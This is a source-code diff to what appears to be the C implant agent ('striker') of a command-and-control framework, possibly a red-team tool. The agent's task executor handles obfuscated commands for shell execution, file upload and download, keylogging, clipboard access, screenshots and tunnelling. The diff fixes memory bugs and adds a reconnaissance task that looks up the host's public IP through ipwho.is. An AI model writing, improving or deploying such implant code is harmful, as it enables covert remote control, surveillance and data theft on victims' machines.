@@ -176,7 +176,7 @@ int http_get(char *url, buffer *body){
     snprintf(target_url, url_len + 1, "%s%s", BASE_URL, url);
   }else{
     target_url = malloc(strlen(url) + 1);
-    strncpy(target_url, url, strlen(url));
+    strncpy(target_url, url, strlen(url) + 1);
   }
   #ifdef IS_LINUX
     CURL *curl = curl_easy_init();
@@ -210,11 +210,15 @@ int http_get(char *url, buffer *body){
   #else
     HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     HINTERNET hResponse = InternetOpenUrlA(hInternet, target_url, "", 0, STRIKER_WININET_OPTIONS, 0);
-    free(target_url);
     if (!hResponse){
+      #ifdef STRIKER_DEBUG
+      printf("Error making GET request to %s: %ld\n", target_url, GetLastError());
+      #endif
       InternetCloseHandle(hInternet);
+      free(target_url);
       return 0;
     }
+    free(target_url);
     DWORD dwStatusCode;
     DWORD dwHeaderSize = sizeof(DWORD);
     HttpQueryInfo(hResponse, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwHeaderSize, NULL);
@@ -247,7 +251,7 @@ int http_post(char *url, cJSON *data, buffer *body){
     snprintf(target_url, url_len + 1, "%s%s", BASE_URL, url);
   }else{
     target_url = malloc(strlen(url) + 1);
-    strncpy(target_url, url, strlen(url));
+    strncpy(target_url, url, strlen(url) + 1);
   }
   #ifdef IS_LINUX
     CURL *curl = curl_easy_init();
@@ -1434,8 +1438,8 @@ DWORD WINAPI task_executor(LPVOID ptr)
   #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload", "[OBFS_ENC]clipread", "[OBFS_ENC]clipwrite", "[OBFS_ENC]screenshot", "[OBFS_ENC]kbdfile"};
-  for (int i = 0; i < 15; i++)
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload", "[OBFS_ENC]clipread", "[OBFS_ENC]clipwrite", "[OBFS_ENC]screenshot", "[OBFS_ENC]kbdfile", "[OBFS_ENC]ipinfo"};
+  for (int i = 0; i < 16; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
     char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
@@ -1627,6 +1631,11 @@ DWORD WINAPI task_executor(LPVOID ptr)
     strncpy(striker->kbd_event_file, cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "file")), PATH_MAX - 1);
     tsk->successful = 1;
     #endif
+  }else if (!strcmp(tsk->type, cmd_strs[15])){
+    char strs[][36] = {"[OBFS_ENC]https://ipwho.is", "[OBFS_ENC]Error fetching data!"};
+    tsk->successful = http_get(obfs_decode(strs[0]), result_buff) != 0;
+    if (!tsk->successful)
+      buffer_strcpy(result_buff, obfs_decode(strs[1]));
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
@@ -1672,8 +1681,8 @@ void start_session(){
   striker->uid = malloc(AGENT_UID_SIZE);
   memset(striker->uid, 0, AGENT_UID_SIZE);
   obfs_decode(AUTH_KEY);
-  striker->auth_key = malloc(strlen(AUTH_KEY));
-  strncpy(striker->auth_key, AUTH_KEY, strlen(AUTH_KEY));
+  striker->auth_key = malloc(strlen(AUTH_KEY) + 1);
+  strncpy(striker->auth_key, AUTH_KEY, strlen(AUTH_KEY) + 1);
   striker->delay = atoi(DELAY);
   if (striker->delay == 0)
     striker->delay = 10;
